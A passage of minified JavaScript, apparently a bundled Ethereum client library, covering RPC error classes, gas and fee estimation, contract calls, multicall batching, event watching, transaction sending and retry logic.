oo{constructor(e){super(e,{code:Vo.code,shortMessage:"The requested method and/or account has not been authorized by the user."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"UnauthorizedProviderError"})}}Object.defineProperty(Vo,"code",{enumerable:!0,configurable:!0,writable:!0,value:4100});class Zo extends oo{constructor(e){super(e,{code:Zo.code,shortMessage:"The Provider does not support the requested method."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"UnsupportedProviderMethodError"})}}Object.defineProperty(Zo,"code",{enumerable:!0,configurable:!0,writable:!0,value:4200});class Go extends oo{constructor(e){super(e,{code:Go.code,shortMessage:"The Provider is disconnected from all chains."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ProviderDisconnectedError"})}}Object.defineProperty(Go,"code",{enumerable:!0,configurable:!0,writable:!0,value:4900});class qo extends oo{constructor(e){super(e,{code:qo.code,shortMessage:"The Provider is not connected to the requested chain."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ChainDisconnectedError"})}}Object.defineProperty(qo,"code",{enumerable:!0,configurable:!0,writable:!0,value:4901});class an extends oo{constructor(e){super(e,{code:an.code,shortMessage:"An error occurred when attempting to switch chain."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"SwitchChainError"})}}Object.defineProperty(an,"code",{enumerable:!0,configurable:!0,writable:!0,value:4902});class Qg extends Rt{constructor(e){super(e,{shortMessage:"An unknown RPC error occurred."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"UnknownRpcError"})}}const ew=3;function Ko(t,{abi:e,address:n,args:r,docsPath:o,functionName:i,sender:a}){const{code:s,data:c,message:l,shortMessage:u}=t instanceof cd?t:t instanceof G?t.walk(m=>"data"in m)||t.walk():{},p=t instanceof wc?new Yg({functionName:i}):[ew,Ri.code].includes(s)&&(c||l||u)?new nu({abi:e,data:typeof c=="object"?c.data:c,functionName:i,message:u??l}):t;return new sd(p,{abi:e,args:r,contractAddress:n,docsPath:o,functionName:i,sender:a})}class ao extends G{constructor({docsPath:e}={}){super(["Could not find an Account to execute with this Action.","Please provide an Account with the `account` argument on the Action, or by supplying an `account` to the WalletClient."].join(`
`),{docsPath:e,docsSlug:"account"}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AccountNotFoundError"})}}class tw extends G{constructor(e,{account:n,docsPath:r,chain:o,data:i,gas:a,gasPrice:s,maxFeePerGas:c,maxPriorityFeePerGas:l,nonce:u,to:p,value:m}){var w;const g=Ma({from:n==null?void 0:n.address,to:p,value:typeof m<"u"&&`${ad(m)} ${((w=o==null?void 0:o.nativeCurrency)==null?void 0:w.symbol)||"ETH"}`,data:i,gas:a,gasPrice:typeof s<"u"&&`${Ot(s)} gwei`,maxFeePerGas:typeof c<"u"&&`${Ot(c)} gwei`,maxPriorityFeePerGas:typeof l<"u"&&`${Ot(l)} gwei`,nonce:u});super(e.shortMessage,{cause:e,docsPath:r,metaMessages:[...e.metaMessages?[...e.metaMessages," "]:[],"Estimate Gas Arguments:",g].filter(Boolean)}),Object.defineProperty(this,"cause",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"EstimateGasExecutionError"}),this.cause=e}}function ud(t,e){const n=(t.details||"").toLowerCase(),r=t.walk(o=>o.code===Ti.code);return r instanceof G?new Ti({cause:t,message:r.details}):Ti.nodeMessage.test(n)?new Ti({cause:t,message:t.details}):Es.nodeMessage.test(n)?new Es({cause:t,maxFeePerGas:e==null?void 0:e.maxFeePerGas}):Zl.nodeMessage.test(n)?new Zl({cause:t,maxFeePerGas:e==null?void 0:e.maxFeePerGas}):Gl.nodeMessage.test(n)?new Gl({cause:t,nonce:e==null?void 0:e.nonce}):ql.nodeMessage.test(n)?new ql({cause:t,nonce:e==null?void 0:e.nonce}):Kl.nodeMessage.test(n)?new Kl({cause:t,nonce:e==null?void 0:e.nonce}):Yl.nodeMessage.test(n)?new Yl({cause:t}):Jl.nodeMessage.test(n)?new Jl({cause:t,gas:e==null?void 0:e.gas}):Xl.nodeMessage.test(n)?new Xl({cause:t,gas:e==null?void 0:e.gas}):Ql.nodeMessage.test(n)?new Ql({cause:t}):Cs.nodeMessage.test(n)?new Cs({cause:t,maxFeePerGas:e==null?void 0:e.maxFeePerGas,maxPriorityFeePerGas:e==null?void 0:e.maxPriorityFeePerGas}):new mc({cause:t})}function nw(t,{docsPath:e,...n}){const r=(()=>{const o=ud(t,n);return o instanceof mc?t:o})();return new tw(r,{docsPath:e,...n})}function dd(t,{format:e}){if(!e)return{};const n={};function r(i){const a=Object.keys(i);for(const s of a)s in t&&(n[s]=t[s]),i[s]&&typeof i[s]=="object"&&!Array.isArray(i[s])&&r(i[s])}const o=e(t||{});return r(o),n}function Ua(t){const{account:e,gasPrice:n,maxFeePerGas:r,maxPriorityFeePerGas:o,to:i}=t,a=e?Kt(e):void 0;if(a&&!ur(a.address))throw new ko({address:a.address});if(i&&!ur(i))throw new ko({address:i});if(typeof n<"u"&&(typeof r<"u"||typeof o<"u"))throw new Zg;if(r&&r>2n**256n-1n)throw new Es({maxFeePerGas:r});if(o&&r&&o>r)throw new Cs({maxFeePerGas:r,maxPriorityFeePerGas:o})}class rw extends G{constructor(){super("`baseFeeMultiplier` must be greater than 1."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"BaseFeeScalarError"})}}class fd extends G{constructor(){super("Chain does not support EIP-1559 fees."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Eip1559FeesNotSupportedError"})}}class iw extends G{constructor({maxPriorityFeePerGas:e}){super(`\`maxFeePerGas\` cannot be less than the \`maxPriorityFeePerGas\` (${Ot(e)} gwei).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"MaxFeePerGasTooLowError"})}}class Nh extends G{constructor({blockHash:e,blockNumber:n}){let r="Block";e&&(r=`Block at hash "${e}"`),n&&(r=`Block at number "${n}"`),super(`${r} could not be found.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"BlockNotFoundError"})}}async function dr(t,{blockHash:e,blockNumber:n,blockTag:r,includeTransactions:o}={}){var u,p,m;const i=r??"latest",a=o??!1,s=n!==void 0?xe(n):void 0;let c=null;if(e?c=await t.request({method:"eth_getBlockByHash",params:[e,a]}):c=await t.request({method:"eth_getBlockByNumber",params:[s||i,a]}),!c)throw new Nh({blockHash:e,blockNumber:n});return(((m=(p=(u=t.chain)==null?void 0:u.formatters)==null?void 0:p.block)==null?void 0:m.format)||gh)(c)}async function hd(t){const e=await t.request({method:"eth_gasPrice"});return BigInt(e)}async function ow(t,e){return kh(t,e)}async function kh(t,e){var i,a,s;const{block:n,chain:r=t.chain,request:o}=e||{};if(typeof((i=r==null?void 0:r.fees)==null?void 0:i.defaultPriorityFee)=="function"){const c=n||await he(t,dr,"getBlock")({});return r.fees.defaultPriorityFee({block:c,client:t,request:o})}if(typeof((a=r==null?void 0:r.fees)==null?void 0:a.defaultPriorityFee)<"u")return(s=r==null?void 0:r.fees)==null?void 0:s.defaultPriorityFee;try{const c=await t.request({method:"eth_maxPriorityFeePerGas"});return hc(c)}catch{const[c,l]=await Promise.all([n?Promise.resolve(n):he(t,dr,"getBlock")({}),he(t,hd,"getGasPrice")({})]);if(typeof c.baseFeePerGas!="bigint")throw new fd;const u=l-c.baseFeePerGas;return u<0n?0n:u}}async function aw(t,e){return iu(t,e)}async function iu(t,e){var m,g;const{block:n,chain:r=t.chain,request:o,type:i="eip1559"}=e||{},a=await(async()=>{var w,v;return typeof((w=r==null?void 0:r.fees)==null?void 0:w.baseFeeMultiplier)=="function"?r.fees.baseFeeMultiplier({block:n,client:t,request:o}):((v=r==null?void 0:r.fees)==null?void 0:v.baseFeeMultiplier)??1.2})();if(a<1)throw new rw;const c=10**(((m=a.toString().split(".")[1])==null?void 0:m.length)??0),l=w=>w*BigInt(Math.ceil(a*c))/BigInt(c),u=n||await he(t,dr,"getBlock")({});if(typeof((g=r==null?void 0:r.fees)==null?void 0:g.estimateFeesPerGas)=="function")return r.fees.estimateFeesPerGas({block:n,client:t,multiply:l,request:o,type:i});if(i==="eip1559"){if(typeof u.baseFeePerGas!="bigint")throw new fd;const w=o!=null&&o.maxPriorityFeePerGas?o.maxPriorityFeePerGas:await kh(t,{block:u,chain:r,request:o}),v=l(u.baseFeePerGas);return{maxFeePerGas:(o==null?void 0:o.maxFeePerGas)??v+w,maxPriorityFeePerGas:w}}return{gasPrice:(o==null?void 0:o.gasPrice)??l(await he(t,hd,"getGasPrice")({}))}}async function Mh(t,{address:e,blockTag:n="latest",blockNumber:r}){const o=await t.request({method:"eth_getTransactionCount",params:[e,r?xe(r):n]});return wt(o)}function sw(t){if(t.type)return t.type;if(typeof t.maxFeePerGas<"u"||typeof t.maxPriorityFeePerGas<"u")return"eip1559";if(typeof t.gasPrice<"u")return typeof t.accessList<"u"?"eip2930":"legacy";throw new Gg({transaction:t})}async function xc(t,e){const{account:n=t.account,chain:r,gas:o,nonce:i,type:a}=e;if(!n)throw new ao;const s=Kt(n),c=await he(t,dr,"getBlock")({blockTag:"latest"}),l={...e,from:s.address};if(typeof i>"u"&&(l.nonce=await he(t,Mh,"getTransactionCount")({address:s.address,blockTag:"pending"})),typeof a>"u")try{l.type=sw(l)}catch{l.type=typeof c.baseFeePerGas=="bigint"?"eip1559":"legacy"}if(l.type==="eip1559"){const{maxFeePerGas:u,maxPriorityFeePerGas:p}=await iu(t,{block:c,chain:r,request:l});if(typeof e.maxPriorityFeePerGas>"u"&&e.maxFeePerGas&&e.maxFeePerGas<p)throw new iw({maxPriorityFeePerGas:p});l.maxPriorityFeePerGas=p,l.maxFeePerGas=u}else{if(typeof e.maxFeePerGas<"u"||typeof e.maxPriorityFeePerGas<"u")throw new fd;const{gasPrice:u}=await iu(t,{block:c,chain:r,request:l,type:"legacy"});l.gasPrice=u}return typeof o>"u"&&(l.gas=await he(t,pd,"estimateGas")({...l,account:{address:s.address,type:"json-rpc"}})),Ua(l),l}async function pd(t,e){var o,i,a;const n=e.account??t.account;if(!n)throw new ao({docsPath:"/docs/actions/public/estimateGas"});const r=Kt(n);try{const{accessList:s,blockNumber:c,blockTag:l,data:u,gas:p,gasPrice:m,maxFeePerGas:g,maxPriorityFeePerGas:w,nonce:v,to:E,value:I,...b}=r.type==="local"?await xc(t,e):e,x=(c?xe(c):void 0)||l;Ua(e);const C=(a=(i=(o=t.chain)==null?void 0:o.formatters)==null?void 0:i.transactionRequest)==null?void 0:a.format,f=(C||pc)({...dd(b,{format:C}),from:r.address,accessList:s,data:u,gas:p,gasPrice:m,maxFeePerGas:g,maxPriorityFeePerGas:w,nonce:v,to:E,value:I}),T=await t.request({method:"eth_estimateGas",params:x?[f,x]:[f]});return BigInt(T)}catch(s){throw nw(s,{...e,account:r,chain:t.chain})}}async function cw(t,{abi:e,address:n,args:r,functionName:o,...i}){const a=xr({abi:e,args:r,functionName:o});try{return await he(t,pd,"estimateGas")({data:a,to:n,...i})}catch(s){const c=i.account?Kt(i.account):void 0;throw Ko(s,{abi:e,address:n,args:r,docsPath:"/docs/contract/estimateContractGas",functionName:o,sender:c==null?void 0:c.address})}}const If="/docs/contract/decodeEventLog";function Ba({abi:t,data:e,strict:n,topics:r}){const o=n??!0,[i,...a]=r;if(!i)throw new Wm({docsPath:If});const s=t.find(w=>w.type==="event"&&i===td(Wn(w)));if(!(s&&"name"in s)||s.type!=="event")throw new zm(i,{docsPath:If});const{name:c,inputs:l}=s,u=l==null?void 0:l.some(w=>!("name"in w&&w.name));let p=u?[]:{};const m=l.filter(w=>"indexed"in w&&w.indexed);for(let w=0;w<m.length;w++){const v=m[w],E=a[w];if(!E)throw new io({abiItem:s,param:v});p[v.name||w]=lw({param:v,value:E})}const g=l.filter(w=>!("indexed"in w&&w.indexed));if(g.length>0){if(e&&e!=="0x")try{const w=vc(g,e);if(w)if(u)p=[...p,...w];else for(let v=0;v<g.length;v++)p[g[v].name]=w[v]}catch(w){if(o)throw w instanceof Qu?new Hr({abiItem:s,data:w.data,params:w.params,size:w.size}):w}else if(o)throw new Hr({abiItem:s,data:"0x",params:g,size:0})}return{eventName:c,args:Object.values(p).length>0?p:void 0}}function lw({param:t,value:e}){return t.type==="string"||t.type==="bytes"||t.type==="tuple"||t.type.match(/^(.*)\[(\d+)?\]$/)?e:(vc([t],e)||[])[0]}async function md(t,{address:e,blockHash:n,fromBlock:r,toBlock:o,event:i,events:a,args:s,strict:c}={}){const l=c??!1,u=a??(i?[i]:void 0);let p=[];u&&(p=[u.flatMap(g=>ka({abi:[g],eventName:g.name,args:s}))],i&&(p=p[0]));let m;return n?m=await t.request({method:"eth_getLogs",params:[{address:e,topics:p,blockHash:n}]}):m=await t.request({method:"eth_getLogs",params:[{address:e,topics:p,fromBlock:typeof r=="bigint"?xe(r):r,toBlock:typeof o=="bigint"?xe(o):o}]}),m.map(g=>{var w;try{const{eventName:v,args:E}=u?Ba({abi:u,data:g.data,topics:g.topics,strict:l}):{eventName:void 0,args:void 0};return on(g,{args:E,eventName:v})}catch(v){let E,I;if(v instanceof Hr||v instanceof io){if(l)return;E=v.abiItem.name,I=(w=v.abiItem.inputs)==null?void 0:w.some(b=>!("name"in b&&b.name))}return on(g,{args:I?[]:{},eventName:E})}}).filter(Boolean)}async function Uh(t,{abi:e,address:n,args:r,blockHash:o,eventName:i,fromBlock:a,toBlock:s,strict:c}){const l=i?Na({abi:e,name:i}):void 0,u=l?void 0:e.filter(p=>p.type==="event");return he(t,md,"getLogs")({address:n,args:r,blockHash:o,event:l,events:u,fromBlock:a,toBlock:s,strict:c})}const ul="/docs/contract/decodeFunctionResult";function so({abi:t,args:e,functionName:n,data:r}){let o=t[0];if(n&&(o=Na({abi:t,args:e,name:n}),!o))throw new Ss(n,{docsPath:ul});if(o.type!=="function")throw new Ss(void 0,{docsPath:ul});if(!o.outputs)throw new Hm(o.name,{docsPath:ul});const i=vc(o.outputs,r);if(i&&i.length>1)return i;if(i&&i.length===1)return i[0]}const uw="modulepreload",dw=function(t){return"/"+t},$f={},ki=function(e,n,r){let o=Promise.resolve();if(n&&n.length>0){const i=document.getElementsByTagName("link");o=Promise.all(n.map(a=>{if(a=dw(a),a in $f)return;$f[a]=!0;const s=a.endsWith(".css"),c=s?'[rel="stylesheet"]':"";if(!!r)for(let p=i.length-1;p>=0;p--){const m=i[p];if(m.href===a&&(!s||m.rel==="stylesheet"))return}else if(document.querySelector(`link[href="${a}"]${c}`))return;const u=document.createElement("link");if(u.rel=s?"stylesheet":uw,s||(u.as="script",u.crossOrigin=""),u.href=a,document.head.appendChild(u),s)return new Promise((p,m)=>{u.addEventListener("load",p),u.addEventListener("error",()=>m(new Error(`Unable to preload CSS for ${a}`)))})}))}return o.then(()=>e()).catch(i=>{const a=new Event("vite:preloadError",{cancelable:!0});if(a.payload=i,window.dispatchEvent(a),!a.defaultPrevented)throw i})},ou=[{inputs:[{components:[{name:"target",type:"address"},{name:"allowFailure",type:"bool"},{name:"callData",type:"bytes"}],name:"calls",type:"tuple[]"}],name:"aggregate3",outputs:[{components:[{name:"success",type:"bool"},{name:"returnData",type:"bytes"}],name:"returnData",type:"tuple[]"}],stateMutability:"view",type:"function"}],Bh=[{inputs:[],name:"ResolverNotFound",type:"error"},{inputs:[],name:"ResolverWildcardNotSupported",type:"error"}],Lh=[...Bh,{name:"resolve",type:"function",stateMutability:"view",inputs:[{name:"name",type:"bytes"},{name:"data",type:"bytes"}],outputs:[{name:"",type:"bytes"},{name:"address",type:"address"}]}],fw=[...Bh,{name:"reverse",type:"function",stateMutability:"view",inputs:[{type:"bytes",name:"reverseName"}],outputs:[{type:"string",name:"resolvedName"},{type:"address",name:"resolvedAddress"},{type:"address",name:"reverseResolver"},{type:"address",name:"resolver"}]}],Of=[{name:"text",type:"function",stateMutability:"view",inputs:[{name:"name",type:"bytes32"},{name:"key",type:"string"}],outputs:[{name:"",type:"string"}]}],Pf=[{name:"addr",type:"function",stateMutability:"view",inputs:[{name:"name",type:"bytes32"}],outputs:[{name:"",type:"address"}]},{name:"addr",type:"function",stateMutability:"view",inputs:[{name:"name",type:"bytes32"},{name:"coinType",type:"uint256"}],outputs:[{name:"",type:"bytes"}]}],hw=[{inputs:[{internalType:"address",name:"_signer",type:"address"},{internalType:"bytes32",name:"_hash",type:"bytes32"},{internalType:"bytes",name:"_signature",type:"bytes"}],stateMutability:"nonpayable",type:"constructor"}],pw="0x82ad56cb";function co({blockNumber:t,chain:e,contract:n}){var o;const r=(o=e==null?void 0:e.contracts)==null?void 0:o[n];if(!r)throw new Vl({chain:e,contract:{name:n}});if(t&&r.blockCreated&&r.blockCreated>t)throw new Vl({blockNumber:t,chain:e,contract:{name:n,blockCreated:r.blockCreated}});return r.address}function mw(t,{docsPath:e,...n}){const r=(()=>{const o=ud(t,n);return o instanceof mc?t:o})();return new Rh(r,{docsPath:e,...n})}const dl=new Map;function gd({fn:t,id:e,shouldSplitBatch:n,wait:r=0,sort:o}){const i=async()=>{const u=c();a();const p=u.map(({args:m})=>m);p.length!==0&&t(p).then(m=>{var g;o&&Array.isArray(m)&&m.sort(o);for(let w=0;w<u.length;w++){const{pendingPromise:v}=u[w];(g=v.resolve)==null||g.call(v,[m[w],m])}}).catch(m=>{var g;for(let w=0;w<u.length;w++){const{pendingPromise:v}=u[w];(g=v.reject)==null||g.call(v,m)}})},a=()=>dl.delete(e),s=()=>c().map(({args:u})=>u),c=()=>dl.get(e)||[],l=u=>dl.set(e,[...c(),u]);return{flush:a,async schedule(u){const p={},m=new Promise((v,E)=>{p.resolve=v,p.reject=E});return(n==null?void 0:n([...s(),u]))&&i(),c().length>0?(l({args:u,pendingPromise:p}),m):(l({args:u,pendingPromise:p}),setTimeout(i,r),m)}}}async function _c(t,e){var I,b,_,x;const{account:n=t.account,batch:r=!!((I=t.batch)!=null&&I.multicall),blockNumber:o,blockTag:i="latest",accessList:a,data:s,gas:c,gasPrice:l,maxFeePerGas:u,maxPriorityFeePerGas:p,nonce:m,to:g,value:w,...v}=e,E=n?Kt(n):void 0;try{Ua(e);const A=(o?xe(o):void 0)||i,f=(x=(_=(b=t.chain)==null?void 0:b.formatters)==null?void 0:_.transactionRequest)==null?void 0:x.format,R=(f||pc)({...dd(v,{format:f}),from:E==null?void 0:E.address,accessList:a,data:s,gas:c,gasPrice:l,maxFeePerGas:u,maxPriorityFeePerGas:p,nonce:m,to:g,value:w});if(r&&gw({request:R}))try{return await ww(t,{...R,blockNumber:o,blockTag:i})}catch(k){if(!(k instanceof wh)&&!(k instanceof Vl))throw k}const N=await t.request({method:"eth_call",params:A?[R,A]:[R]});return N==="0x"?{data:void 0}:{data:N}}catch(C){const A=bw(C),{offchainLookup:f,offchainLookupSignature:T}=await ki(()=>import("./ccip-KShDX8AM.js"),__vite__mapDeps([]));if((A==null?void 0:A.slice(0,10))===T&&g)return{data:await f(t,{data:A,to:g})};throw mw(C,{...e,account:E,chain:t.chain})}}function gw({request:t}){const{data:e,to:n,...r}=t;return!(!e||e.startsWith(pw)||!n||Object.values(r).filter(o=>typeof o<"u").length>0)}async function ww(t,e){var v;const{batchSize:n=1024,wait:r=0}=typeof((v=t.batch)==null?void 0:v.multicall)=="object"?t.batch.multicall:{},{blockNumber:o,blockTag:i="latest",data:a,multicallAddress:s,to:c}=e;let l=s;if(!l){if(!t.chain)throw new wh;l=co({blockNumber:o,chain:t.chain,contract:"multicall3"})}const p=(o?xe(o):void 0)||i,{schedule:m}=gd({id:`${t.uid}.${p}`,wait:r,shouldSplitBatch(E){return E.reduce((b,{data:_})=>b+(_.length-2),0)>n*2},fn:async E=>{const I=E.map(x=>({allowFailure:!0,callData:x.data,target:x.to})),b=xr({abi:ou,args:[I],functionName:"aggregate3"}),_=await t.request({method:"eth_call",params:[{data:b,to:l},p]});return so({abi:ou,args:[I],functionName:"aggregate3",data:_||"0x"})}}),[{returnData:g,success:w}]=await m({data:a,to:c});if(!w)throw new cd({data:g});return g==="0x"?{data:void 0}:{data:g}}function bw(t){if(!(t instanceof G))return;const e=t.walk();return typeof e.data=="object"?e.data.data:e.data}async function fr(t,{abi:e,address:n,args:r,functionName:o,...i}){const a=xr({abi:e,args:r,functionName:o});try{const{data:s}=await he(t,_c,"call")({data:a,to:n,...i});return so({abi:e,args:r,functionName:o,data:s||"0x"})}catch(s){throw Ko(s,{abi:e,address:n,args:r,docsPath:"/docs/contract/readContract",functionName:o})}}async function yw(t,{abi:e,address:n,args:r,dataSuffix:o,functionName:i,...a}){const s=a.account?Kt(a.account):void 0,c=xr({abi:e,args:r,functionName:i});try{const{data:l}=await he(t,_c,"call")({batch:!1,data:`${c}${o?o.replace("0x",""):""}`,to:n,...a});return{result:so({abi:e,args:r,functionName:i,data:l||"0x"}),request:{abi:e,address:n,args:r,dataSuffix:o,functionName:i,...a}}}catch(l){throw Ko(l,{abi:e,address:n,args:r,docsPath:"/docs/contract/simulateContract",functionName:i,sender:s==null?void 0:s.address})}}const fl=new Map,Df=new Map;let vw=0;function lo(t,e,n){const r=++vw,o=()=>fl.get(t)||[],i=()=>{const u=o();fl.set(t,u.filter(p=>p.id!==r))},a=()=>{const u=Df.get(t);o().length===1&&u&&u(),i()},s=o();if(fl.set(t,[...s,{id:r,fns:e}]),s&&s.length>0)return a;const c={};for(const u in e)c[u]=(...p)=>{var g,w;const m=o();if(m.length!==0)for(const v of m)(w=(g=v.fns)[u])==null||w.call(g,...p)};const l=n(c);return typeof l=="function"&&Df.set(t,l),a}async function Ts(t){return new Promise(e=>setTimeout(e,t))}function La(t,{emitOnBegin:e,initialWaitTime:n,interval:r}){let o=!0;const i=()=>o=!1;return(async()=>{let s;e&&(s=await t({unpoll:i}));const c=await(n==null?void 0:n(s))??r;await Ts(c);const l=async()=>{o&&(await t({unpoll:i}),await Ts(r),l())};l()})(),i}const xw=new Map,_w=new Map;function Ew(t){const e=(o,i)=>({clear:()=>i.delete(o),get:()=>i.get(o),set:a=>i.set(o,a)}),n=e(t,xw),r=e(t,_w);return{clear:()=>{n.clear(),r.clear()},promise:n,response:r}}async function Cw(t,{cacheKey:e,cacheTime:n=1/0}){const r=Ew(e),o=r.response.get();if(o&&n>0&&new Date().getTime()-o.created.getTime()<n)return o.data;let i=r.promise.get();i||(i=t(),r.promise.set(i));try{const a=await i;return r.response.set({created:new Date,data:a}),a}finally{r.promise.clear()}}const Sw=t=>`blockNumber.${t}`;async function ja(t,{cacheTime:e=t.cacheTime,maxAge:n}={}){const r=await Cw(()=>t.request({method:"eth_blockNumber"}),{cacheKey:Sw(t.uid),cacheTime:n??e});return BigInt(r)}async function Ec(t,{filter:e}){const n="strict"in e&&e.strict;return(await e.request({method:"eth_getFilterChanges",params:[e.id]})).map(o=>{var i;if(typeof o=="string")return o;try{const{eventName:a,args:s}="abi"in e&&e.abi?Ba({abi:e.abi,data:o.data,topics:o.topics,strict:n}):{eventName:void 0,args:void 0};return on(o,{args:s,eventName:a})}catch(a){let s,c;if(a instanceof Hr||a instanceof io){if("strict"in e&&e.strict)return;s=a.abiItem.name,c=(i=a.abiItem.inputs)==null?void 0:i.some(l=>!("name"in l&&l.name))}return on(o,{args:c?[]:{},eventName:s})}}).filter(Boolean)}async function Cc(t,{filter:e}){return e.request({method:"eth_uninstallFilter",params:[e.id]})}function Aw(t,{abi:e,address:n,args:r,batch:o=!0,eventName:i,onError:a,onLogs:s,poll:c,pollingInterval:l=t.pollingInterval,strict:u}){return(typeof c<"u"?c:t.transport.type!=="webSocket")?(()=>{const w=Et(["watchContractEvent",n,r,o,t.uid,i,l]),v=u??!1;return lo(w,{onLogs:s,onError:a},E=>{let I,b,_=!1;const x=La(async()=>{var C;if(!_){try{b=await he(t,Ih,"createContractEventFilter")({abi:e,address:n,args:r,eventName:i,strict:v})}catch{}_=!0;return}try{let A;if(b)A=await he(t,Ec,"getFilterChanges")({filter:b});else{const f=await he(t,ja,"getBlockNumber")({});I&&I!==f?A=await he(t,Uh,"getContractEvents")({abi:e,address:n,args:r,eventName:i,fromBlock:I+1n,toBlock:f,strict:v}):A=[],I=f}if(A.length===0)return;if(o)E.onLogs(A);else for(const f of A)E.onLogs([f])}catch(A){b&&A instanceof Vr&&(_=!1),(C=E.onError)==null||C.call(E,A)}},{emitOnBegin:!0,interval:l});return async()=>{b&&await he(t,Cc,"uninstallFilter")({filter:b}),x()}})})():(()=>{let w=!0,v=()=>w=!1;return(async()=>{try{const E=i?ka({abi:e,eventName:i,args:r}):[],{unsubscribe:I}=await t.transport.subscribe({params:["logs",{address:n,topics:E}],onData(b){var x;if(!w)return;const _=b.result;try{const{eventName:C,args:A}=Ba({abi:e,data:_.data,topics:_.topics,strict:u}),f=on(_,{args:A,eventName:C});s([f])}catch(C){let A,f;if(C instanceof Hr||C instanceof io){if(u)return;A=C.abiItem.name,f=(x=C.abiItem.inputs)==null?void 0:x.some(R=>!("name"in R&&R.name))}const T=on(_,{args:f?[]:{},eventName:A});s([T])}},onError(b){a==null||a(b)}});v=I,w||v()}catch(E){a==null||a(E)}})(),v})()}function jh({chain:t,currentChainId:e}){if(!t)throw new $m;if(e!==t.id)throw new Im({chain:t,currentChainId:e})}function Tw(t,{docsPath:e,...n}){const r=(()=>{const o=ud(t,n);return o instanceof mc?t:o})();return new qg(r,{docsPath:e,...n})}async function Yo(t){const e=await t.request({method:"eth_chainId"});return wt(e)}async function wd(t,{serializedTransaction:e}){return t.request({method:"eth_sendRawTransaction",params:[e]})}async function bd(t,e){var v,E,I,b;const{account:n=t.account,chain:r=t.chain,accessList:o,data:i,gas:a,gasPrice:s,maxFeePerGas:c,maxPriorityFeePerGas:l,nonce:u,to:p,value:m,...g}=e;if(!n)throw new ao({docsPath:"/docs/actions/wallet/sendTransaction"});const w=Kt(n);try{Ua(e);let _;if(r!==null&&(_=await he(t,Yo,"getChainId")({}),jh({currentChainId:_,chain:r})),w.type==="local"){const f=await he(t,xc,"prepareTransactionRequest")({account:w,accessList:o,chain:r,data:i,gas:a,gasPrice:s,maxFeePerGas:c,maxPriorityFeePerGas:l,nonce:u,to:p,value:m,...g});_||(_=await he(t,Yo,"getChainId")({}));const T=(v=r==null?void 0:r.serializers)==null?void 0:v.transaction,R=await w.signTransaction({...f,chainId:_},{serializer:T});return await he(t,wd,"sendRawTransaction")({serializedTransaction:R})}const x=(b=(I=(E=t.chain)==null?void 0:E.formatters)==null?void 0:I.transactionRequest)==null?void 0:b.format,A=(x||pc)({...dd(g,{format:x}),accessList:o,data:i,from:w.address,gas:a,gasPrice:s,maxFeePerGas:c,maxPriorityFeePerGas:l,nonce:u,to:p,value:m});return await t.request({method:"eth_sendTransaction",params:[A]})}catch(_){throw Tw(_,{...e,account:w,chain:e.chain||void 0})}}async function Iw(t,{abi:e,address:n,args:r,dataSuffix:o,functionName:i,...a}){const s=xr({abi:e,args:r,functionName:i});return await he(t,bd,"sendTransaction")({data:`${s}${o?o.replace("0x",""):""}`,to:n,...a})}async function $w(t,{chain:e}){const{id:n,name:r,nativeCurrency:o,rpcUrls:i,blockExplorers:a}=e;await t.request({method:"wallet_addEthereumChain",params:[{chainId:xe(n),chainName:r,nativeCurrency:o,rpcUrls:i.default.http,blockExplorerUrls:a?Object.values(a).map(({url:s})=>s):void 0}]})}const au=256;let os=au,as;function Ow(t=11){if(!as||os+t>au*2){as="",os=0;for(let e=0;e<au;e++)as+=(256+Math.random()*256|0).toString(16).substring(1)}return as.substring(os,os+++t)}function Fh(t){const{batch:e,cacheTime:n=t.pollingInterval??4e3,key:r="base",name:o="Base Client",pollingInterval:i=4e3,type:a="base"}=t,s=t.chain,c=t.account?Kt(t.account):void 0,{config:l,request:u,value:p}=t.transport({chain:s,pollingInterval:i}),m={...l,...p},g={account:c,batch:e,cacheTime:n,chain:s,key:r,name:o,pollingInterval:i,request:u,transport:m,type:a,uid:Ow()};function w(v){return E=>{const I=E(v);for(const _ in g)delete I[_];const b={...v,...I};return Object.assign(b,{extend:w(b)})}}return Object.assign(g,{extend:w(g)})}function su(t,{delay:e=100,retryCount:n=2,shouldRetry:r=()=>!0}={}){return new Promise((o,i)=>{const a=async({count:s=0}={})=>{const c=async({error:l})=>{const u=typeof e=="function"?e({count:s,error:l}):e;u&&await Ts(u),a({count:s+1})};try{const l=await t();o(l)}catch(l){if(s<n&&await r({count:s,error:l}))return c({error:l});i(l)}};a()})}const Wh=t=>"code"in t?t.code!==-1&&t.code!==-32004&&t.code!==-32005&&t.code!==-32042&&t.code!==-32603:t instanceof To&&t.status?t.status!==403&&t.status!==408&&t.status!==413&&t.status!==429&&t.status!==500&&t.status!==502&&t.status!==503&&t.status!==504:!1;function Pw(t,{retryDelay:e=150,retryCount:n=3}={}){return async r=>su(async()=>{try{return await t(r)}catch(o){const i=o;switch(i.code){case Mo.code:throw new Mo(i);case Uo.code:throw new Uo(i);case Bo.code:throw new Bo(i);case Lo.code:throw new Lo(i);case Ri.code:throw new Ri(i);case Vr.code:throw new Vr(i);case jo.code:throw new jo(i);case Ni.code:throw new Ni(i);case Fo.code:throw new Fo(i);case Wo.code:throw new Wo(i);case zo.code:throw new zo(i);case Ho.code:throw new Ho(i);case $t.code:throw new $t(i);case Vo.code:throw new Vo(i);case Zo.code:throw new Zo(i);case Go.code:throw new Go(i);case qo.code:throw new qo(i);case an.code:throw new an(i);case 5e3:throw new $t(i);default:throw o instanceof G?o:new Qg(i)}}},{delay:({count:o,error:i})=>{var a;if(i&&i instanceof To){const s=(a=i==null?void 0:i.headers)==null?void 